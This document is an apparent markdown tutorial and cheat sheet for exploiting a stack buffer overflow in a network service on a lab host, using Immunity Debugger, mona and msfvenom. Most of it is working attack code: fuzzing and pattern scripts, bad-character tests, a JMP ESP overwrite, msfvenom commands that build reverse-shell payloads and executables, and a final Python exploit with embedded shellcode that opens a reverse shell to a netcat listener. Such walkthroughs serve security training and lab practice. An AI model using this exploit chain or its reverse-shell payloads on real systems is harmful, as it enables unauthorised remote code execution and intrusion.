
# Buffer Overflow with Immunity Debugger

<br>

### NOTE - IF HAVING ISSUES
 - If the payload isn't working consistently, then there is probably an issue with the Send/Recv part. Triple check the script is working the same way as it does in netcat!
 - Ensure the IP that the reverse shell is connecting back to is correct, I.E. correct subnet (look at the IP of the target then at local PC).

### Quick Commands
 - Create Patter & Search for Offset
```bash
msf-pattern_create -l 200
msf-pattern_offset -l 200 -q EIP_VALUE
```
 - View Modules
```bash
!mona modules
```

 - Search for `JMP ESP`
```bash
!mona find -s "\xff\xe4" -m APPLICATION_NAME.exe
```

 - Shells
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.147 LPORT=3155 -b "\x00\x0a" -f python --var-name attackPayload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.147 LPORT=3155 -b "\x00" -f python --var-name attackPayload EXITFUNC=thread

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.147 LPORT=3155 -f exe -o reverseX32.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.20.147 LPORT=3155 -f exe -o reverseX64.exe

nc -nlvp 3155
```

<br>

### 1 - Causing a Buffer Overflow
 - Load the application in Immunity Debugger.
 - We need to fuzz the application and determine at which point the buffer overflow occurs.
 - We can do this by sending larger and larger payloads until the application crashs:

```python
import sys, socket
from time import sleep

endpointIp = '192.168.20.141'
endpointPort = 31337

buffer = b'a' * 100

while True:
	try:
		payload = buffer + b'\r\n'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((endpointIp, endpointPort))
		print('Sending Payload of ' + str(len(buffer)) + ' bytes')
		s.send(payload)
		s.close()
		sleep(1)
		buffer = buffer + b'a' * 100
	except:
		print('Fuzzing crashed at ' + str(len(buffer)) + ' bytes')
		sys.exit()
```

 - **NOTE:** This script may need to be modified depending on the application.

 - Let's say that it crashed when sending a payload of 200 bytes.

<br>

### 2 - Determining Exactly where the Overflow Occurs
 - Now that we now a Buffer Overflow can occur, we need to find out exactly where the payload overflows.
 - Because the application crashed with a payload of 200 bytes before, that will be the size of our pattern. Let's generate a payload that can do this
```bash
msf-pattern_create -l 200
```

 - Let's now send this payload to the application. We will need to be monitoring this in Immunity Debugger:
```python
import sys, socket
from time import sleep

endpointIp = '192.168.20.141'
endpointPort = 31337

buffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

payload = buffer + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('[+] Connecting ...');
s.connect((endpointIp, endpointPort))
print('[+] Sending Pattern Payload ...')
s.send(payload)
print('[+] Sent')
s.close()
```
 - After the payload is sent we need to take note of the value in the `EIP` register which is `39654138`.
 - We can now use this value to determine exactly where the overflow occurs:
```bash
msf-pattern_offset -l 200 -q 39654138
```
 - From this we find that exact offset is `146`. This means that after the first 146 bytes, the next 4 bytes will overflow into the `EIP` registor. The `ESP` should point to the rest of the payload.

<br>

### 3 - Determining Bad Characters
 - We now need to determine if there are any bad characters that the program rejects and that we can't use in our final payload. Accepted characters will be different for each program so we need to try them all:
```python
import sys, socket
from time import sleep

endpointIp = '192.168.20.141'
endpointPort = 31337

buffer = b'a' * 146 + b'\x04\x03\x02\x01'

# ALL BAD CHARS
# attackPayload = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

# Modified
attackPayload = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

payload = buffer + attackPayload + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('[+] Connecting ...');
s.connect((endpointIp, endpointPort))
print('[+] Sending Bad Char Payload ...')
s.send(payload)
print('[+] Sent')
s.close()
```
 - The initial payload is now `b'a' * 146 + b'\x04\x03\x02\x01'`. We have 146 a's to fill up the buffer, then 04030201 (Because of Little Endian) which will overflow into the `EIP`, then final all of our bad chars.
 - We need to use Immunity Debugger and determine which characters are causing issues.

 - After sending the initial payload with all the bad characters, we need to inspect the stack. We do this by right-clicking on the `ESP` registor and selecting `Follow in Dump`. We should now be able to see our bad character payload. 

 - Looking at the payload in the dump we can see that after `0A` there is a `00` and then it stops. This means there is mostly likely a problem with `0A` of `0B` (most likely `0A` because it's the line feed control character). Let's remove this from our attack payload and send the payload again.

 - This time it's much better. All of our attack chars are there.

<br>

### 4 - Find & Set EIP Value
 - We can view more information about the processes using:
```bash
!mona modules
```

 - Now that we have our payload stored in the location where the `ESP` register is pointing to, and we can control the `EIP`, we now need to search for the `JMP ESP` command somewhere in the application.
```bash
!mona find -s "\xff\xe4" -m APPLICATION_NAME.exe
```
 - We need to do this so we can set the value of the `EIP` to the address where the `JMP ESP` command is located. That way the next instruction will jump to the start of our payload and it will execute it.

 - From the above command we can see that `0x080414C3` and `0x080416BF` are both locations where this command exists.
 - One of these values must be injected into the `EIP` registor:
```python
b'a' * 146 + b'\xbf\x16\x04\x08' + b'\x90' * 32
```
 - We will also put some no operation commands `90` at the end to pad out our payload.
 - The payload is `bf160408` instead of `0x080416BF` because of little endian.

<br>

### 5 - Generate Reverse Shell Payload
 - The final step being putting it all together is to generate our payload that we want to execute.
 - Let's generate a reverse shell to include in our attack payload. We use the `-b` flag to specify the bad characters we discovered earlier. We should include `00` as a bad character as well.
 - LHOST & LPORT is to specify the endpoint for the reverse shell connection. `-f` is for the format.
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.147 LPORT=3155 -b "\x00\x0a" -f c
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.147 LPORT=3155 -b "\x00\x0a" -f c
```
<br>

### 6 - Putting Everything Together
 - Let's now put everything together into a final script and execute the reverse shell on the target.
 - We'll setup a listener for the reverse shell to connect to first:
```bash
nc -nlvp 3155
```

 - Putting everything together into our final script gives us the following:
```python
import sys, socket
from time import sleep

endpointIp = '192.168.20.141'
endpointPort = 31337

buffer = b'a' * 146 + b'\xbf\x16\x04\x08' + b'\x90' * 32

attackPayload = (b"\xdb\xc5\xbd\x44\x96\x83\xbe\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
b"\x52\x31\x6b\x17\x83\xc3\x04\x03\x2f\x85\x61\x4b\x53\x41\xe7"
b"\xb4\xab\x92\x88\x3d\x4e\xa3\x88\x5a\x1b\x94\x38\x28\x49\x19"
b"\xb2\x7c\x79\xaa\xb6\xa8\x8e\x1b\x7c\x8f\xa1\x9c\x2d\xf3\xa0"
b"\x1e\x2c\x20\x02\x1e\xff\x35\x43\x67\xe2\xb4\x11\x30\x68\x6a"
b"\x85\x35\x24\xb7\x2e\x05\xa8\xbf\xd3\xde\xcb\xee\x42\x54\x92"
b"\x30\x65\xb9\xae\x78\x7d\xde\x8b\x33\xf6\x14\x67\xc2\xde\x64"
b"\x88\x69\x1f\x49\x7b\x73\x58\x6e\x64\x06\x90\x8c\x19\x11\x67"
b"\xee\xc5\x94\x73\x48\x8d\x0f\x5f\x68\x42\xc9\x14\x66\x2f\x9d"
b"\x72\x6b\xae\x72\x09\x97\x3b\x75\xdd\x11\x7f\x52\xf9\x7a\xdb"
b"\xfb\x58\x27\x8a\x04\xba\x88\x73\xa1\xb1\x25\x67\xd8\x98\x21"
b"\x44\xd1\x22\xb2\xc2\x62\x51\x80\x4d\xd9\xfd\xa8\x06\xc7\xfa"
b"\xcf\x3c\xbf\x94\x31\xbf\xc0\xbd\xf5\xeb\x90\xd5\xdc\x93\x7a"
b"\x25\xe0\x41\x2c\x75\x4e\x3a\x8d\x25\x2e\xea\x65\x2f\xa1\xd5"
b"\x96\x50\x6b\x7e\x3c\xab\xfc\x41\x69\xa7\x6f\x29\x68\xc7\x83"
b"\xf9\xe5\x21\xf1\xed\xa3\xfa\x6e\x97\xe9\x70\x0e\x58\x24\xfd"
b"\x10\xd2\xcb\x02\xde\x13\xa1\x10\xb7\xd3\xfc\x4a\x1e\xeb\x2a"
b"\xe2\xfc\x7e\xb1\xf2\x8b\x62\x6e\xa5\xdc\x55\x67\x23\xf1\xcc"
b"\xd1\x51\x08\x88\x1a\xd1\xd7\x69\xa4\xd8\x9a\xd6\x82\xca\x62"
b"\xd6\x8e\xbe\x3a\x81\x58\x68\xfd\x7b\x2b\xc2\x57\xd7\xe5\x82"
b"\x2e\x1b\x36\xd4\x2e\x76\xc0\x38\x9e\x2f\x95\x47\x2f\xb8\x11"
b"\x30\x4d\x58\xdd\xeb\xd5\x68\x94\xb1\x7c\xe1\x71\x20\x3d\x6c"
b"\x82\x9f\x02\x89\x01\x15\xfb\x6e\x19\x5c\xfe\x2b\x9d\x8d\x72"
b"\x23\x48\xb1\x21\x44\x59")

payload = buffer + attackPayload + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('[+] Connecting ...');
s.connect((endpointIp, endpointPort))
print('[+] Sending Reverse Shell Payload ...')
s.send(payload)
print('[+] Sent')
s.close()
```
 - After running the payload we now have a shell!